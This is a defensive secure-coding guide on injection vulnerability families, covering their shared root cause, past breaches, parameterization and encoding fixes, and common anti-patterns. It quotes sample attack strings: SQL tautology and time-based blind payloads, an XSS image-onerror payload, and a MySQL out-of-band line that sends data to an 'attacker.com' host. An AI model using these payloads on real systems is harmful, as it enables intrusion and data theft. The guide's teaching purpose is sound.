# Injection Families

> Every injection vulnerability has the same root cause: untrusted data is interpreted as
> code because the boundary between data and instructions was not enforced -- fix the
> boundary, fix the bug

## When to Use

- Reviewing code that constructs queries, commands, or markup from user input
- Designing input handling for a new application or API endpoint
- Understanding the relationship between SQL injection, XSS, command injection, and other
  injection types
- Training developers on secure coding fundamentals
- Evaluating whether a framework's built-in protections are sufficient
- Auditing code for injection surfaces across the technology stack

## Threat Context

Injection has been in the OWASP Top 10 since its inception and remains OWASP A03:2021.
Despite being well-understood for 25+ years, injection remains prevalent because the root
cause -- mixing code and data -- recurs in every new technology layer:

- **Heartland Payment Systems (2008)**: SQL injection compromised 130 million credit card
  numbers. The largest payment card breach at the time.
- **Sony Pictures (2011)**: SQL injection in the Sony Pictures website exposed 1 million
  user accounts including plaintext passwords.
- **TalkTalk (2015)**: SQL injection by a teenager compromised 157,000 customer records
  including bank account details and sort codes. TalkTalk was fined 400,000 GBP by the ICO.
- **MOVEit Transfer (2023, CVE-2023-34362)**: SQL injection in Progress Software's MOVEit
  file transfer product was exploited by the Cl0p ransomware group. The breach affected
  2,500+ organizations and 65+ million individuals across government, healthcare, finance,
  and education sectors. The vulnerability was a straightforward SQL injection in a
  web-facing component -- a bug class first documented in 1998.
- **Equifax (2017)**: While technically an Apache Struts deserialization vulnerability (a
  close cousin of injection), the breach exposed 147 million Americans' personal data and
  demonstrated that input interpretation bugs in any technology layer can be catastrophic.

The pattern repeats because every new technology introduces a new interpreter: SQL databases,
NoSQL databases, shell environments, browsers (JavaScript/HTML), template engines, LDAP
directories, GraphQL resolvers, expression language engines, XML parsers. Each interpreter is
a potential injection target when it processes untrusted data as instructions.

## Instructions

1. **Understand the universal injection pattern.** Every injection vulnerability follows the
   same three-step structure regardless of the specific technology:
   - (a) The application constructs an instruction by concatenating trusted code with
     untrusted data. Example: `"SELECT * FROM users WHERE name = '" + userInput + "'"`.
   - (b) The instruction is sent to an interpreter (database engine, shell, browser, LDAP
     server, template engine) that cannot distinguish which parts are code and which are
     data.
   - (c) Attacker-supplied data contains interpreter syntax (e.g., `' OR 1=1 --`) that
     alters the intended behavior of the instruction, transforming a data lookup into a data
     dump.

   This pattern is identical across SQL injection, command injection, XSS, LDAP injection,
   template injection, and every other injection variant. The technology changes; the pattern
   does not.

2. **Apply the universal fix: structurally enforce the code/data boundary.** The correct
   defense uses mechanisms that separate data from instructions at the protocol level, making
   injection structurally impossible:
   - **SQL injection -- parameterized queries**: `SELECT * FROM users WHERE id = ?` with the
     value passed as a separate parameter. The database engine receives the query structure
     and the data value through separate channels. The parameter is never parsed as SQL
     syntax, regardless of its content. This is not escaping -- it is structural separation.
   - **XSS -- context-aware output encoding**: HTML-encode (`&lt;`, `&amp;`, `&quot;`) when
     inserting data into HTML content. Attribute-encode when inserting into HTML attributes.
     JavaScript-encode when inserting into JavaScript string contexts. URL-encode when
     inserting into URL parameters. The browser renders the encoded data as text, never as
     markup or script. The encoding must match the output context -- HTML encoding inside a
     JavaScript string context does not prevent XSS.
   - **Command injection -- avoid shell execution entirely**: Use language APIs that do not
     invoke a shell: `child_process.execFile` (Node.js) with an argument array,
     `subprocess.run` (Python) with a list argument and `shell=False`, `ProcessBuilder`
     (Java). These pass arguments directly to the OS exec syscall, bypassing the shell
     interpreter. If shell invocation is truly unavoidable (it rarely is), use the
     language's shell escaping function and validate input against a strict allowlist.
   - **LDAP injection -- parameterized LDAP queries**: Use the LDAP library's filter
     construction API with proper value escaping. Escape special characters (`*`, `(`, `)`,
     `\`, NUL) in filter values per RFC 4515.
   - **Template injection (SSTI) -- sandboxed template engines**: Use logic-less templates
     (Mustache, Handlebars) that do not evaluate arbitrary expressions. If using a full
     template engine (Jinja2, Twig, Freemarker), enable sandbox mode to restrict access to
     dangerous classes and methods. Never pass user input as a template string -- pass it as
     a template variable.
   - **Header injection (CRLF) -- strict input validation**: Reject any input containing
     carriage return (`\r`) or line feed (`\n`) characters before inserting into HTTP
     headers, email headers, or log entries. These characters create new headers or log
     lines, enabling response splitting and log injection.

3. **Apply input validation as defense-in-depth, never as the primary fix.** Allowlist
   validation (e.g., "this field must be a positive integer," "this field must match
   `[a-zA-Z0-9_]{1,50}`") rejects many injection payloads and is valuable as a supporting
   defense. Blocklist validation ("reject input containing `DROP TABLE`, `UNION SELECT`,
   `<script>`") is always bypassable through encoding, case variation, comment insertion,
   Unicode normalization, and dozens of other techniques. Parameterization is the primary fix
   that eliminates the vulnerability. Validation is a secondary layer that reduces the attack
   surface. A system with both is stronger than either alone.

4. **Map injection surfaces in your technology stack.** For each technology layer in your
   application, answer three questions: What interpreter processes the data? Can user input
   reach that interpreter? Is the input parameterized or concatenated? Common injection
   surfaces:
   - **SQL databases**: Any raw query construction (even within an ORM's escape hatch)
   - **NoSQL databases**: MongoDB `$where` clauses, operator injection (`$gt`, `$ne`),
     aggregation pipelines with user input
   - **Operating system shells**: `exec()`, `system()`, backtick execution, `os.popen()`
   - **Browser rendering engine**: DOM manipulation with user content, `innerHTML`,
     `document.write()`, unescaped template bindings
   - **Email headers**: User-controlled values in From, To, Subject, or custom headers
   - **HTTP response headers**: User input reflected in `Set-Cookie`, `Location`, or custom
     headers
   - **Template engines**: User input passed as template source rather than template variable
   - **XML parsers**: External entity processing (XXE) enabling file read and SSRF
   - **LDAP directories**: User input in LDAP filter construction
   - **GraphQL resolvers**: User input in dynamically constructed resolver logic
   - **Regular expression engines**: User-controlled regex patterns enabling ReDoS
     (catastrophic backtracking)

5. **Use framework-provided protections and audit every bypass.** Modern frameworks
   parameterize by default: ORMs (ActiveRecord, SQLAlchemy, Prisma, Entity Framework)
   generate parameterized SQL for standard CRUD operations. React escapes JSX content by
   default, preventing XSS. Angular sanitizes template bindings. Django's template engine
   auto-escapes HTML. The vulnerability occurs when developers bypass these protections: raw
   SQL queries in the ORM (`Model.objects.raw()`, `sequelize.query()`),
   `dangerouslySetInnerHTML` in React, `[innerHTML]` binding in Angular, `|safe` filter in
   Django templates, template literal composition in template engines. Every bypass in the
   codebase is a potential injection point. Audit them all. Require code review approval for
   any new bypass with a documented security justification.

## Details

- **The complete injection family taxonomy**: SQL injection (interpreter: SQL engine), NoSQL
  injection (interpreter: document store query engine), Command injection / OS injection
  (interpreter: shell -- bash, cmd.exe, PowerShell), Cross-site scripting / XSS
  (interpreter: browser rendering engine), Server-side template injection / SSTI
  (interpreter: template engine -- Jinja2, Twig, Freemarker, Velocity), LDAP injection
  (interpreter: LDAP directory server), XPath injection (interpreter: XML query engine),
  Header injection / CRLF injection (interpreter: HTTP parser, email parser), Expression
  Language injection / EL injection (interpreter: Java EL engine, Spring SpEL), GraphQL
  injection (interpreter: GraphQL resolver), XML External Entity injection / XXE
  (interpreter: XML parser), ReDoS / Regular Expression Denial of Service (interpreter:
  regex engine). Every entry in this list shares the same root cause: untrusted data
  interpreted as instructions by a processing engine.

- **Second-order injection -- the delayed-execution variant**: Data is stored safely (via
  parameterized query) but later retrieved and used unsafely in a different context. Example:
  a user registers with username `<img src=x onerror=alert(1)>`. The registration query is
  parameterized, so no SQL injection occurs during storage. Later, an admin dashboard
  retrieves the username and inserts it into an HTML page without encoding. The stored XSS
  payload executes in the admin's browser. Another example: a value stored in the database
  is later concatenated into a shell command by a background job. Defense: every output
  context requires its own encoding or parameterization, regardless of how the data was
  stored. Trust no data, even from your own database.

- **Blind injection and out-of-band exfiltration**: When the application does not return the
  injected query's results directly (no error messages, no visible output differences),
  attackers use blind techniques: (a) Boolean-based blind: inject conditions that change the
  response (e.g., `' AND 1=1 --` vs `' AND 1=2 --`) and observe response differences
  (content length, HTTP status, timing). (b) Time-based blind: inject `SLEEP(5)` or
  `WAITFOR DELAY '0:0:5'` and measure response time to extract data one bit at a time.
  (c) Out-of-band: force the database to make DNS lookups or HTTP requests to an
  attacker-controlled server, carrying exfiltrated data in the request (e.g.,
  `LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))` in MySQL). Parameterization
  prevents all blind and out-of-band techniques because the payload is never interpreted as
  code.

- **The defense-in-depth stack for injection**: Layer 1 -- Parameterization: eliminates the
  vulnerability at the source by separating code from data. Layer 2 -- Input validation:
  rejects obviously malicious or unexpected input before it reaches the interpreter. Layer 3
  -- Web Application Firewall (WAF): catches common attack patterns at the network edge, but
  is always bypassable by a determined attacker and should never be the sole defense. Layer
  4 -- Least-privilege database accounts: limits the damage if injection occurs (a read-only
  account cannot `DROP TABLE`). Layer 5 -- Error handling: never expose SQL errors, stack
  traces, database versions, or internal table/column names to the user -- these accelerate
  exploitation. All five layers should be present; none is sufficient alone except
  parameterization, which is necessary and often sufficient for a specific injection point.

## Anti-Patterns

1. **String concatenation for query or command construction.**
   `query = "SELECT * FROM users WHERE name = '" + name + "'"` is the canonical injection
   vulnerability. `os.system("convert " + filename + " output.png")` is command injection.
   `html = "<div>" + userComment + "</div>"` is XSS. In every case, the fix is the same: use
   the parameterized/encoded equivalent provided by the language or framework. There is no
   legitimate reason to concatenate untrusted input into an interpreter instruction in
   modern code.

2. **Blocklist-based input validation as the sole defense.** Filtering `DROP TABLE`,
   `UNION SELECT`, `<script>`, `../` from input. Attackers bypass blocklists with: case
   variation (`dRoP tAbLe`), encoding (`%3Cscript%3E`, Unicode normalization), comment
   insertion (`DR/**/OP`), alternative syntax (`<img/src=x onerror=alert(1)>`), and
   technology-specific tricks that grow with every new interpreter version. Blocklists never
   cover all attack vectors. Parameterization does.

3. **"We use an ORM, so SQL injection is impossible."** ORMs generate parameterized queries
   for standard operations (find, create, update, delete). But every ORM provides an escape
   hatch for raw SQL: `ActiveRecord.connection.execute()`, `sequelize.query()`,
   `EntityManager.createNativeQuery()`, `db.raw()` in Knex. Developers under deadline
   pressure use raw queries with string concatenation. A single raw query bypass is enough
   for a complete database compromise. Audit every raw query invocation in the codebase and
   require security review for new ones.

4. **Trusting data from "internal" sources.** Data from internal APIs, message queues,
   databases, or partner systems still requires parameterization when used in an interpreter
   context. If Service A stores user input in a database and Service B reads it and
   concatenates it into a shell command, Service B has a command injection vulnerability
   regardless of Service A's input validation. The trust boundary is at the interpreter, not
   at the data source. Every interpreter invocation with non-constant data requires
   parameterization.

5. **Client-side validation as a security control.** JavaScript validation in the browser is
   a user experience feature, not a security control. Attackers bypass client-side validation
   trivially: curl, Postman, browser developer tools, proxy tools (Burp Suite), or simply
   disabling JavaScript. All input validation must be enforced server-side. Client-side
   validation improves UX by providing immediate feedback; server-side validation enforces
   security.

6. **Assuming encoding is universal across contexts.** HTML-encoding user input and inserting
   it into a JavaScript string context does not prevent XSS. URL-encoding and inserting into
   an HTML attribute does not prevent XSS. Each output context has its own encoding
   requirements: HTML content, HTML attributes, JavaScript strings, CSS values, URL
   parameters, and JSON responses each require different encoding functions. Using the wrong
   encoding for the context provides a false sense of security while leaving the injection
   viable.

7. **Relying on a WAF to prevent injection.** WAFs (ModSecurity, AWS WAF, Cloudflare)
   provide useful defense-in-depth by blocking known attack patterns at the network edge. But
   WAFs operate on pattern matching of HTTP requests -- they cannot understand application
   semantics. Sophisticated attackers bypass WAFs through encoding, chunked requests,
   parameter pollution, and application-specific payload construction. A WAF that blocks
   `UNION SELECT` does not block the same payload split across two HTTP parameters that the
   application concatenates server-side. Fix the vulnerability in the code; use the WAF as
   an additional layer, not a substitute.
